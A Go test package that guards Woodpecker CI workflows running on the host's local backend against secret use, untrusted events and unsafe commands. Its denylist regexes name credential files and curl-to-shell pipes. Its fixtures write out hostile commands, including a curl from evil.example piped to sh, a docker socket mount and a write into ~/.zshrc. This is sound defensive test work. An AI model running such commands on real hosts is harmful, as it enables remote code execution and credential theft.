// Package workflowguard is the local-agent compromise boundary guard. It is
// a test-only package: the entire guard lives here and is exercised by the
// tests below against the real .woodpecker/*.yml tree and against doctored
// copies in temporary directories.
//
// The guard encodes three CI invariants:
//
//  1. A workflow that runs on Woodpecker's local backend (a step whose image
//     names a local-shell executable -- bash/sh/dash/zsh/ksh/busybox,
//     pwsh/powershell, cmd, and their .exe forms, with any registry path,
//     tag or digest stripped -- or workflow labels selecting backend: local)
//     executes directly on the worker host with no container boundary. It
//     must not reference secrets, must not touch credential files, and must
//     not run privileged/unsafe commands (docker socket mounts, writes into
//     $HOME configuration, curl|sh).
//  2. Native/local workflows must stay on trusted push/manual/tag events and
//     must advertise backend: local in their workflow-level labels.
//  3. No branch-protection required context may name a workflow that never
//     runs on pull_request, or every PR waits for a check that is never
//     scheduled.
package workflowguard

import (
	"bytes"
	"fmt"
	"os"
	"path/filepath"
	"regexp"
	"sort"
	"strings"
	"testing"

	"gopkg.in/yaml.v3"
)

// Finding is one guard violation, precise enough to point at the file, the
// step and the assertion that failed.
type Finding struct {
	File    string
	Step    string
	Kind    string
	Message string
}

func (f Finding) String() string {
	where := f.File
	if f.Step != "" {
		where += ": step " + f.Step
	}
	return fmt.Sprintf("%s [%s]: %s", where, f.Kind, f.Message)
}

// Step is the subset of a Woodpecker step the guard inspects.
type Step struct {
	Name        string
	Image       string
	Commands    []string
	Environment map[string]string
}

// Workflow is the subset of a Woodpecker workflow the guard inspects.
type Workflow struct {
	File string
	Name string
	// Labels are the workflow-level agent labels (e.g. backend: local).
	Labels map[string]string
	// Events are the `when` event names (event may be a scalar or a list).
	Events []string
	Steps  []Step
	// SecretPaths are YAML paths under which a secret is referenced through
	// `secrets:` or `from_secret`.
	SecretPaths []string
}

func documentMapping(root *yaml.Node) *yaml.Node {
	if root == nil {
		return nil
	}
	if root.Kind == yaml.DocumentNode {
		if len(root.Content) == 0 {
			return nil
		}
		root = root.Content[0]
	}
	if root.Kind != yaml.MappingNode {
		return nil
	}
	return root
}

func mappingValue(node *yaml.Node, key string) *yaml.Node {
	if node == nil || node.Kind != yaml.MappingNode {
		return nil
	}
	for i := 0; i+1 < len(node.Content); i += 2 {
		if node.Content[i].Value == key {
			return node.Content[i+1]
		}
	}
	return nil
}

// walkNode visits every mapping key in the node tree, reporting the dotted
// path to the key, the key itself and its value node.
func walkNode(node *yaml.Node, path string, fn func(path, key string, val *yaml.Node)) {
	if node == nil {
		return
	}
	switch node.Kind {
	case yaml.DocumentNode:
		for _, c := range node.Content {
			walkNode(c, path, fn)
		}
	case yaml.MappingNode:
		for i := 0; i+1 < len(node.Content); i += 2 {
			key := node.Content[i].Value
			val := node.Content[i+1]
			p := key
			if path != "" {
				p = path + "." + key
			}
			fn(p, key, val)
			walkNode(val, p, fn)
		}
	case yaml.SequenceNode:
		for i, c := range node.Content {
			walkNode(c, fmt.Sprintf("%s[%d]", path, i), fn)
		}
	case yaml.AliasNode:
		walkNode(node.Alias, path, fn)
	}
}

func parseEvents(when *yaml.Node) []string {
	var out []string
	var add func(n *yaml.Node)
	add = func(n *yaml.Node) {
		if n == nil {
			return
		}
		switch n.Kind {
		case yaml.ScalarNode:
			if n.Value != "" {
				out = append(out, n.Value)
			}
		case yaml.SequenceNode:
			for _, c := range n.Content {
				add(c)
			}
		}
	}
	switch when.Kind {
	case yaml.SequenceNode:
		for _, entry := range when.Content {
			add(mappingValue(entry, "event"))
		}
	case yaml.MappingNode:
		add(mappingValue(when, "event"))
	}
	return out
}

// LoadFile parses one workflow file into the guard's view.
func LoadFile(path string) (Workflow, error) {
	b, err := os.ReadFile(path)
	if err != nil {
		return Workflow{}, err
	}
	var root yaml.Node
	if err := yaml.Unmarshal(b, &root); err != nil {
		return Workflow{}, fmt.Errorf("%s: %w", path, err)
	}
	w := Workflow{File: filepath.Base(path), Labels: map[string]string{}}
	doc := documentMapping(&root)
	if doc == nil {
		return w, nil
	}
	if name := mappingValue(doc, "name"); name != nil && name.Kind == yaml.ScalarNode {
		w.Name = name.Value
	}
	if labels := mappingValue(doc, "labels"); labels != nil && labels.Kind == yaml.MappingNode {
		for i := 0; i+1 < len(labels.Content); i += 2 {
			w.Labels[labels.Content[i].Value] = labels.Content[i+1].Value
		}
	}
	if when := mappingValue(doc, "when"); when != nil {
		w.Events = parseEvents(when)
	}
	if steps := mappingValue(doc, "steps"); steps != nil && steps.Kind == yaml.MappingNode {
		for i := 0; i+1 < len(steps.Content); i += 2 {
			step := Step{Name: steps.Content[i].Value, Environment: map[string]string{}}
			node := steps.Content[i+1]
			if image := mappingValue(node, "image"); image != nil && image.Kind == yaml.ScalarNode {
				step.Image = image.Value
			}
			if cmds := mappingValue(node, "commands"); cmds != nil && cmds.Kind == yaml.SequenceNode {
				for _, c := range cmds.Content {
					if c.Kind == yaml.ScalarNode {
						step.Commands = append(step.Commands, c.Value)
					}
				}
			}
			if env := mappingValue(node, "environment"); env != nil && env.Kind == yaml.MappingNode {
				for j := 0; j+1 < len(env.Content); j += 2 {
					key, val := env.Content[j].Value, env.Content[j+1]
					if val.Kind == yaml.ScalarNode {
						step.Environment[key] = val.Value
					} else if mappingValue(val, "from_secret") != nil {
						step.Environment[key] = "from_secret"
					}
				}
			}
			w.Steps = append(w.Steps, step)
		}
	}
	walkNode(doc, "", func(p, key string, val *yaml.Node) {
		switch key {
		case "from_secret":
			w.SecretPaths = append(w.SecretPaths, p)
		case "secrets":
			nonEmpty := (val.Kind == yaml.SequenceNode || val.Kind == yaml.MappingNode) && len(val.Content) > 0
			if nonEmpty {
				w.SecretPaths = append(w.SecretPaths, p)
			}
		}
	})
	return w, nil
}

// LoadDir parses every *.yml (and *.yaml) directly under dir.
func LoadDir(dir string) ([]Workflow, error) {
	var files []string
	for _, pattern := range []string{"*.yml", "*.yaml"} {
		matches, err := filepath.Glob(filepath.Join(dir, pattern))
		if err != nil {
			return nil, err
		}
		files = append(files, matches...)
	}
	sort.Strings(files)
	out := make([]Workflow, 0, len(files))
	for _, f := range files {
		w, err := LoadFile(f)
		if err != nil {
			return nil, err
		}
		out = append(out, w)
	}
	return out, nil
}

// localShellExecutables are the normalized `image` values that mean "the local
// backend runs this command directly on the worker host" (Woodpecker local
// backend: image is the shell/executable, not a container image).
var localShellExecutables = map[string]bool{
	"bash":       true,
	"sh":         true,
	"dash":       true,
	"zsh":        true,
	"ksh":        true,
	"busybox":    true,
	"pwsh":       true,
	"powershell": true,
	"cmd":        true,
	"cmd.exe":    true,
	"bash.exe":   true,
	"sh.exe":     true,
}

// normalizeImageExecutable reduces an image value to the executable the local
// backend would run: the basename of the registry path, with a trailing
// `:tag` or `@digest` stripped. That makes execution-equivalent spellings
// (`/bin/sh`, `bash:5`, `bash@sha256:...`, `docker.io/library/bash`) classify
// the same as the bare shell name.
func normalizeImageExecutable(image string) string {
	s := strings.ToLower(strings.TrimSpace(image))
	if i := strings.LastIndexAny(s, `/\`); i >= 0 {
		s = s[i+1:]
	}
	if i := strings.IndexByte(s, '@'); i >= 0 {
		s = s[:i]
	}
	if i := strings.LastIndexByte(s, ':'); i >= 0 {
		s = s[:i]
	}
	return s
}

// restrictedLocalEvents is the only event set a local workflow may select:
// events only reachable by users with write access to this repository. A
// pull_request event would execute fork-controlled code on the host.
var restrictedLocalEvents = map[string]bool{
	"push":   true,
	"manual": true,
	"tag":    true,
}

type unsafePattern struct {
	name string
	re   *regexp.Regexp
}

// localUnsafePatterns is the small denylist of privileged/unsafe commands a
// local workflow must never run.
var localUnsafePatterns = []unsafePattern{
	{"docker-socket-mount", regexp.MustCompile(`(?i)(/var/run/docker\.sock|docker\.sock)`)},
	{"privileged-container", regexp.MustCompile(`(?i)(^|\s)--privileged(\s|=|$)`)},
	{"remote-shell-pipe", regexp.MustCompile(`(?i)\b(curl|wget)\b[^\n|]*\|[^\n|]*\b(sh|bash|zsh|pwsh|powershell)\b`)},
	{"credential-file", regexp.MustCompile(`(?i)(\.netrc\b|\.docker/config\.json|\.aws/credentials|\.ssh/id_|\.git-credentials|\.kube/config|\bkubeconfig\b)`)},
}

// writesHomeConfig reports whether a command both touches a $HOME dotfile
// and contains a write indicator.
func writesHomeConfig(cmd string) bool {
	lower := strings.ToLower(cmd)
	home := strings.Contains(lower, "~/.") ||
		strings.Contains(lower, "$home/.") ||
		strings.Contains(lower, "${home}/.")
	if !home {
		return false
	}
	for _, indicator := range []string{">", "tee ", "sed -i", "cat >", "cp ", "mv ", "install "} {
		if strings.Contains(lower, indicator) {
			return true
		}
	}
	return false
}

// IsLocal reports whether the workflow executes on the local backend: any
// step whose normalized image names a local-shell executable, or
// workflow-level labels selecting backend: local. The label check is
// conservative: a workflow that advertises backend: local stays local
// regardless of its image values.
func IsLocal(w Workflow) bool {
	if strings.EqualFold(strings.TrimSpace(w.Labels["backend"]), "local") {
		return true
	}
	for _, s := range w.Steps {
		if localShellExecutables[normalizeImageExecutable(s.Image)] {
			return true
		}
	}
	return false
}

// CheckWorkflow applies the local-agent boundary rules. Non-local workflows
// are out of scope for these assertions (container isolation is the
// boundary there).
func CheckWorkflow(w Workflow) []Finding {
	if !IsLocal(w) {
		return nil
	}
	var findings []Finding
	add := func(step, kind, msg string) {
		findings = append(findings, Finding{File: w.File, Step: step, Kind: kind, Message: msg})
	}
	if !strings.EqualFold(strings.TrimSpace(w.Labels["backend"]), "local") {
		add("", "local-labels", "runs local-shell steps but the workflow labels do not advertise backend: local")
	}
	if len(w.Events) == 0 {
		add("", "local-events", "declares no when events; a local workflow must stay on trusted push/manual/tag events")
	}
	seen := map[string]bool{}
	for _, ev := range w.Events {
		if seen[ev] {
			continue
		}
		seen[ev] = true
		if !restrictedLocalEvents[ev] {
			add("", "local-events", fmt.Sprintf("event %q is not a trusted push/manual/tag event; a local workflow must never run fork-controlled events", ev))
		}
	}
	for _, p := range w.SecretPaths {
		if !strings.HasPrefix(p, "steps.") {
			add("", "local-secret", "references a secret at "+p)
		}
	}
	for _, s := range w.Steps {
		if !localShellExecutables[normalizeImageExecutable(s.Image)] {
			add(s.Name, "local-image", fmt.Sprintf("image %q is not a local shell (bash/sh/dash/zsh/ksh/busybox/pwsh/powershell/cmd)", s.Image))
		}
		prefix := "steps." + s.Name + "."
		for _, p := range w.SecretPaths {
			if strings.HasPrefix(p, prefix) {
				add(s.Name, "local-secret", "references a secret at "+p)
			}
		}
		for i, cmd := range s.Commands {
			for _, p := range localUnsafePatterns {
				if p.re.MatchString(cmd) {
					add(s.Name, "local-unsafe", fmt.Sprintf("command %d matches forbidden %s", i+1, p.name))
				}
			}
			if writesHomeConfig(cmd) {
				add(s.Name, "local-unsafe", fmt.Sprintf("command %d writes into $HOME configuration", i+1))
			}
		}
	}
	return findings
}

// ParseRequiredContexts extracts the required PR status contexts from the
// branch-protection script's CONTEXTS line textually (the script is shell,
// not YAML).
func ParseRequiredContexts(script string) []string {
	var out []string
	for _, line := range strings.Split(script, "\n") {
		trimmed := strings.TrimSpace(line)
		if !strings.HasPrefix(trimmed, "CONTEXTS=") {
			continue
		}
		value := strings.TrimSpace(strings.TrimPrefix(trimmed, "CONTEXTS="))
		if strings.HasPrefix(value, `"`) {
			value = strings.TrimPrefix(value, `"`)
			if i := strings.Index(value, `"`); i >= 0 {
				value = value[:i]
			}
		}
		if i := strings.Index(value, ":-"); i >= 0 {
			value = value[i+2:]
		} else if i := strings.Index(value, "="); i >= 0 {
			value = value[i+1:]
		}
		// Drop the closing brace of a "${VAR:-default}" expansion.
		value = strings.TrimSuffix(value, "}")
		value = strings.Trim(value, `"'`)
		out = append(out, strings.Fields(value)...)
	}
	return out
}

// workflowName is the Woodpecker workflow identity used in status contexts:
// the explicit top-level name when present, otherwise the file base name.
func workflowName(w Workflow) string {
	if strings.TrimSpace(w.Name) != "" {
		return strings.TrimSpace(w.Name)
	}
	return strings.TrimSuffix(w.File, filepath.Ext(w.File))
}

func runsOnPullRequest(events []string) bool {
	for _, ev := range events {
		if ev == "pull_request" || strings.HasPrefix(ev, "pull_request") {
			return true
		}
	}
	return false
}

// CheckRequiredContexts fails when a required PR context names a workflow
// that never runs on pull_request (or does not exist): such a context is
// never produced and every PR would wait forever for it.
func CheckRequiredContexts(workflows []Workflow, script string) []Finding {
	byName := map[string]Workflow{}
	for _, w := range workflows {
		byName[workflowName(w)] = w
	}
	var findings []Finding
	for _, ctx := range ParseRequiredContexts(script) {
		if !strings.HasPrefix(ctx, "ci/woodpecker/") {
			continue
		}
		name := strings.TrimPrefix(ctx, "ci/woodpecker/")
		w, ok := byName[name]
		if !ok {
			findings = append(findings, Finding{
				File: "scripts/gh-branch-protection.sh", Kind: "required-context",
				Message: fmt.Sprintf("required context %q names workflow %q with no matching .woodpecker workflow", ctx, name),
			})
			continue
		}
		if !runsOnPullRequest(w.Events) {
			findings = append(findings, Finding{
				File: w.File, Kind: "required-context",
				Message: fmt.Sprintf("workflow %q is required as PR context %q but never runs on pull_request (events: %s)", name, ctx, strings.Join(w.Events, ", ")),
			})
		}
	}
	return findings
}

// FormatFindings renders findings one per line for test failures.
func FormatFindings(findings []Finding) string {
	if len(findings) == 0 {
		return "(no findings)"
	}
	var b strings.Builder
	for _, f := range findings {
		b.WriteString("  - " + f.String() + "\n")
	}
	return b.String()
}

func repoRoot(t *testing.T) string {
	t.Helper()
	root, err := filepath.Abs(filepath.Join("..", ".."))
	if err != nil {
		t.Fatal(err)
	}
	return root
}

func mustRead(t *testing.T, path string) []byte {
	t.Helper()
	b, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	return b
}

func mustWrite(t *testing.T, path string, data []byte) {
	t.Helper()
	if err := os.WriteFile(path, data, 0o644); err != nil {
		t.Fatal(err)
	}
}

func allFindings(t *testing.T, workflows []Workflow, script string) []Finding {
	t.Helper()
	var out []Finding
	for _, w := range workflows {
		out = append(out, CheckWorkflow(w)...)
	}
	return append(out, CheckRequiredContexts(workflows, script)...)
}

// TestWorkflowGuardCleanRepoPasses runs the guard against the real tree: it
// must parse every top-level .woodpecker/*.yml, find zero violations, and
// actually cover the local workflows (the guard must not pass by detecting
// nothing).
func TestWorkflowGuardCleanRepoPasses(t *testing.T) {
	root := repoRoot(t)
	wfDir := filepath.Join(root, ".woodpecker")
	globs, err := filepath.Glob(filepath.Join(wfDir, "*.yml"))
	if err != nil {
		t.Fatal(err)
	}
	workflows, err := LoadDir(wfDir)
	if err != nil {
		t.Fatal(err)
	}
	if len(workflows) != len(globs) {
		t.Fatalf("parsed %d workflows but found %d .woodpecker/*.yml files", len(workflows), len(globs))
	}
	if len(workflows) < 7 {
		t.Fatalf("parsed %d workflows, want the full lane set (>=7)", len(workflows))
	}
	script := string(mustRead(t, filepath.Join(root, "scripts", "gh-branch-protection.sh")))
	if findings := allFindings(t, workflows, script); len(findings) > 0 {
		t.Fatalf("workflow guard findings on the real tree:\n%s", FormatFindings(findings))
	}
	// The guard must be exercising real local workflows, not zero of them.
	locals := 0
	for _, w := range workflows {
		if IsLocal(w) {
			locals++
			if !strings.EqualFold(strings.TrimSpace(w.Labels["backend"]), "local") {
				t.Fatalf("%s: local workflow does not advertise backend: local", w.File)
			}
		}
	}
	if locals < 2 {
		t.Fatalf("guard classified only %d local workflows, want at least native-macos and native-windows", locals)
	}
	for _, want := range []string{"native-macos.yml", "native-windows.yml", "linux-amd64.yml"} {
		found := false
		for _, w := range workflows {
			if w.File == want {
				found = true
			}
		}
		if !found {
			t.Fatalf("workflow %s was not parsed", want)
		}
	}
}

// TestWorkflowGuardParsesRequiredContexts pins the textual parse of the
// branch-protection script so a reformat cannot silently empty the required
// context list the guard cross-checks.
func TestWorkflowGuardParsesRequiredContexts(t *testing.T) {
	root := repoRoot(t)
	script := string(mustRead(t, filepath.Join(root, "scripts", "gh-branch-protection.sh")))
	got := ParseRequiredContexts(script)
	want := []string{
		"ci/woodpecker/linux-amd64",
		"ci/woodpecker/linux-arm64",
		"ci/woodpecker/docker-workspace",
		"ci/woodpecker/integration-coverage",
	}
	if strings.Join(got, " ") != strings.Join(want, " ") {
		t.Fatalf("ParseRequiredContexts = %v, want %v", got, want)
	}
}

// TestWorkflowGuardDoctoredLocalFailures proves the guard fails on doctored
// copies of a real local workflow: a secret reference, curl|sh, a docker
// socket mount, a $HOME config write, and an added pull_request event. The
// real YAML is never modified (byte-compared afterwards).
func TestWorkflowGuardDoctoredLocalFailures(t *testing.T) {
	realPath := filepath.Join(repoRoot(t), ".woodpecker", "native-macos.yml")
	real := mustRead(t, realPath)
	cases := []struct {
		name    string
		old     string
		new     string
		kind    string
		step    string
		wantMsg string
	}{
		{
			name: "env from_secret in a local step", kind: "local-secret", step: "", wantMsg: "RELEASE_TOKEN",
			old: "    environment:\n      GOTOOLCHAIN: local\n",
			new: "    environment:\n      GOTOOLCHAIN: local\n      RELEASE_TOKEN:\n        from_secret: release-token\n",
		},
		{
			name: "curl piped to sh", kind: "local-unsafe", step: "", wantMsg: "remote-shell-pipe",
			old: "    commands:\n",
			new: "    commands:\n      - curl -fsSL https://evil.example/install.sh | sh\n",
		},
		{
			name: "docker socket mount", kind: "local-unsafe", step: "", wantMsg: "docker-socket-mount",
			old: "    commands:\n",
			new: "    commands:\n      - docker run -v /var/run/docker.sock:/var/run/docker.sock docker:cli info\n",
		},
		{
			name: "write into $HOME config", kind: "local-unsafe", step: "", wantMsg: "$HOME config",
			old: "    commands:\n",
			new: "    commands:\n      - echo pwned >> ~/.zshrc\n",
		},
		{
			name: "pull_request on a local workflow", kind: "local-events", step: "", wantMsg: "pull_request",
			old: "event: [push, manual, tag]",
			new: "event: [push, manual, tag, pull_request]",
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			doctored := strings.Replace(string(real), tc.old, tc.new, 1)
			if doctored == string(real) {
				t.Fatalf("doctoring %q did not apply", tc.old)
			}
			dir := t.TempDir()
			path := filepath.Join(dir, "native-macos.yml")
			mustWrite(t, path, []byte(doctored))
			w, err := LoadFile(path)
			if err != nil {
				t.Fatal(err)
			}
			findings := CheckWorkflow(w)
			var match *Finding
			for i := range findings {
				f := findings[i]
				if f.Kind == tc.kind && (tc.step == "" || f.Step == tc.step) && strings.Contains(f.Message, tc.wantMsg) {
					match = &findings[i]
					break
				}
			}
			if match == nil {
				t.Fatalf("guard missed the doctored %s; findings:\n%s", tc.name, FormatFindings(findings))
			}
			if match.File != "native-macos.yml" {
				t.Fatalf("finding file = %q, want native-macos.yml (%s)", match.File, match.String())
			}
			t.Logf("guard finding: %s", match.String())
		})
	}
	if got := mustRead(t, realPath); !bytes.Equal(got, real) {
		t.Fatal("guard test modified the real .woodpecker/native-macos.yml")
	}
}

// TestWorkflowGuardNormalizesImageExecutables pins the image normalization
// rule: basename of the registry path, then `@digest` and `:tag` stripped,
// lowercased and trimmed. Execution-equivalent spellings must collapse to the
// bare shell name, and ordinary container images must not.
func TestWorkflowGuardNormalizesImageExecutables(t *testing.T) {
	cases := map[string]string{
		"bash":                           "bash",
		" BASH ":                         "bash",
		"/bin/sh":                        "sh",
		"/bin/bash":                      "bash",
		"bash:5":                         "bash",
		"bash@sha256:deadbeef":           "bash",
		"docker.io/library/bash:5":       "bash",
		"ghcr.io/org/sh@sha256:cafebabe": "sh",
		"busybox:1.36":                   "busybox",
		`C:\Windows\System32\cmd.exe`:    "cmd.exe",
		"cmd.exe":                        "cmd.exe",
		"golang:1.27":                    "golang",
		"postgres:16-alpine":             "postgres",
		"docker:cli":                     "docker",
		"bashful:latest":                 "bashful",
		"":                               "",
	}
	for in, want := range cases {
		if got := normalizeImageExecutable(in); got != want {
			t.Errorf("normalizeImageExecutable(%q) = %q, want %q", in, got, want)
		}
	}
}

// TestWorkflowGuardEquivalentLocalImagesFail proves execution-equivalent
// local-backend spellings are classified local and therefore caught by every
// guard rule. The doctored copies come from real container lanes
// (.woodpecker/linux-amd64.yml) whose labels do NOT select the local backend,
// so only the image detector can make them local. The real YAMLs are never
// modified (byte-compared afterwards).
func TestWorkflowGuardEquivalentLocalImagesFail(t *testing.T) {
	const goImage = "golang:1.27@sha256:f44f6e88636cfb311f9ebace870ded69d943f227bb3cb27d32ffd84ea18c43ea"
	realPath := filepath.Join(repoRoot(t), ".woodpecker", "linux-amd64.yml")
	real := mustRead(t, realPath)

	cases := []struct {
		name    string
		old     string
		new     string
		kind    string
		step    string
		wantMsg string
	}{
		{
			name: "sh image with a secret", kind: "local-secret", step: "format", wantMsg: "RELEASE_TOKEN",
			old: "  format:\n    image: " + goImage + "\n    commands:\n",
			new: "  format:\n    image: sh\n    environment:\n      RELEASE_TOKEN:\n        from_secret: release-token\n    commands:\n",
		},
		{
			name: "digest-pinned bash with a secret", kind: "local-secret", step: "format", wantMsg: "RELEASE_TOKEN",
			old: "  format:\n    image: " + goImage + "\n    commands:\n",
			new: "  format:\n    image: bash@sha256:deadbeef\n    environment:\n      RELEASE_TOKEN:\n        from_secret: release-token\n    commands:\n",
		},
		{
			name: "/bin/sh image on a pull_request workflow", kind: "local-events", step: "", wantMsg: "pull_request",
			old: "  format:\n    image: " + goImage + "\n",
			new: "  format:\n    image: /bin/sh\n",
		},
		{
			name: "bash:5 image with a docker socket mount", kind: "local-unsafe", step: "format", wantMsg: "docker-socket-mount",
			old: "  format:\n    image: " + goImage + "\n    commands:\n",
			new: "  format:\n    image: bash:5\n    commands:\n      - docker run -v /var/run/docker.sock:/var/run/docker.sock docker:cli info\n",
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			doctored := strings.Replace(string(real), tc.old, tc.new, 1)
			if doctored == string(real) {
				t.Fatalf("doctoring %q did not apply", tc.old)
			}
			path := filepath.Join(t.TempDir(), "linux-amd64.yml")
			mustWrite(t, path, []byte(doctored))
			w, err := LoadFile(path)
			if err != nil {
				t.Fatal(err)
			}
			if !IsLocal(w) {
				t.Fatalf("workflow with a local-shell image was not classified local")
			}
			findings := CheckWorkflow(w)
			var match *Finding
			for i := range findings {
				f := findings[i]
				if f.Kind == tc.kind && (tc.step == "" || f.Step == tc.step) && strings.Contains(f.Message, tc.wantMsg) {
					match = &findings[i]
					break
				}
			}
			if match == nil {
				t.Fatalf("guard missed the doctored %s; findings:\n%s", tc.name, FormatFindings(findings))
			}
			if match.File != "linux-amd64.yml" {
				t.Fatalf("finding file = %q, want linux-amd64.yml (%s)", match.File, match.String())
			}
			t.Logf("guard finding: %s", match.String())
		})
	}
	if got := mustRead(t, realPath); !bytes.Equal(got, real) {
		t.Fatal("guard test modified the real .woodpecker/linux-amd64.yml")
	}
}

// TestWorkflowGuardImageClassificationEdges covers the conservative label
// rule, the Windows local shell, and the false-positive side: a normal
// container image with a secret and a pull_request event must not be
// classified local, while backend: local labels keep a workflow local
// regardless of its image.
func TestWorkflowGuardImageClassificationEdges(t *testing.T) {
	load := func(t *testing.T, name, body string) Workflow {
		t.Helper()
		path := filepath.Join(t.TempDir(), name)
		mustWrite(t, path, []byte(body))
		w, err := LoadFile(path)
		if err != nil {
			t.Fatal(err)
		}
		return w
	}

	t.Run("cmd on windows is local", func(t *testing.T) {
		w := load(t, "native-windows.yml", "labels:\n  platform: windows/amd64\nwhen:\n  - event: [push]\nsteps:\n  build:\n    image: cmd\n    commands:\n      - go version\n")
		if !IsLocal(w) {
			t.Fatal("image cmd on a windows workflow was not classified local")
		}
		findings := CheckWorkflow(w)
		var match *Finding
		for i := range findings {
			if findings[i].Kind == "local-labels" {
				match = &findings[i]
			}
		}
		if match == nil {
			t.Fatalf("local cmd step must require backend: local labels; findings:\n%s", FormatFindings(findings))
		}
		t.Logf("guard finding: %s", match.String())
	})

	t.Run("backend local label stays local regardless of image", func(t *testing.T) {
		w := load(t, "labelled.yml", "labels:\n  backend: local\nwhen:\n  - event: [push]\nsteps:\n  build:\n    image: golang:1.27\n    commands:\n      - go version\n")
		if !IsLocal(w) {
			t.Fatal("backend: local labels were not honored")
		}
		findings := CheckWorkflow(w)
		var match *Finding
		for i := range findings {
			if findings[i].Kind == "local-image" && findings[i].Step == "build" {
				match = &findings[i]
			}
		}
		if match == nil {
			t.Fatalf("a labelled local workflow with a container image must be flagged; findings:\n%s", FormatFindings(findings))
		}
		t.Logf("guard finding: %s", match.String())
	})

	t.Run("container image is not misclassified", func(t *testing.T) {
		w := load(t, "linux-amd64.yml", "when:\n  - event: [push, pull_request]\nsteps:\n  unit:\n    image: golang:1.27\n    environment:\n      RELEASE_TOKEN:\n        from_secret: release-token\n    commands:\n      - go test ./...\n")
		if IsLocal(w) {
			t.Fatal("container image golang:1.27 was misclassified as local")
		}
		if findings := CheckWorkflow(w); len(findings) != 0 {
			t.Fatalf("non-local workflow produced findings:\n%s", FormatFindings(findings))
		}
	})

	t.Run("real container lane is not local", func(t *testing.T) {
		w, err := LoadFile(filepath.Join(repoRoot(t), ".woodpecker", "linux-amd64.yml"))
		if err != nil {
			t.Fatal(err)
		}
		if IsLocal(w) {
			t.Fatal("real .woodpecker/linux-amd64.yml was misclassified as local")
		}
	})
}

// TestWorkflowGuardDoctoredRequiredContextFails proves the context
// cross-check fails when a required context's workflow does not run on
// pull_request, and that adding the event clears it.
func TestWorkflowGuardDoctoredRequiredContextFails(t *testing.T) {
	dir := t.TempDir()
	withoutPR := []byte("when:\n  - event: [push, manual]\nsteps:\n  unit:\n    image: golang:1.27\n    commands: [go test ./...]\n")
	mustWrite(t, filepath.Join(dir, "linux-amd64.yml"), withoutPR)
	workflows, err := LoadDir(dir)
	if err != nil {
		t.Fatal(err)
	}
	script := "CONTEXTS=\"${KIWI_CONTEXTS:-ci/woodpecker/linux-amd64 ci/woodpecker/ghost}\"\n"
	findings := CheckRequiredContexts(workflows, script)
	if len(findings) != 2 {
		t.Fatalf("findings = %d, want 2:\n%s", len(findings), FormatFindings(findings))
	}
	var sawNeverPR, sawGhost bool
	for _, f := range findings {
		if f.File == "linux-amd64.yml" && f.Kind == "required-context" && strings.Contains(f.Message, "never runs on pull_request") {
			sawNeverPR = true
		}
		if f.File == "scripts/gh-branch-protection.sh" && strings.Contains(f.Message, "ghost") {
			sawGhost = true
		}
	}
	if !sawNeverPR || !sawGhost {
		t.Fatalf("findings missing the never-PR or missing-workflow assertions:\n%s", FormatFindings(findings))
	}
	for _, f := range findings {
		t.Logf("guard finding: %s", f.String())
	}

	withPR := []byte("when:\n  - event: [push, pull_request, manual]\nsteps:\n  unit:\n    image: golang:1.27\n    commands: [go test ./...]\n")
	mustWrite(t, filepath.Join(dir, "linux-amd64.yml"), withPR)
	workflows, err = LoadDir(dir)
	if err != nil {
		t.Fatal(err)
	}
	findings = CheckRequiredContexts(workflows, script)
	if len(findings) != 1 || !strings.Contains(findings[0].Message, "ghost") {
		t.Fatalf("adding pull_request must clear the context finding, got:\n%s", FormatFindings(findings))
	}
}
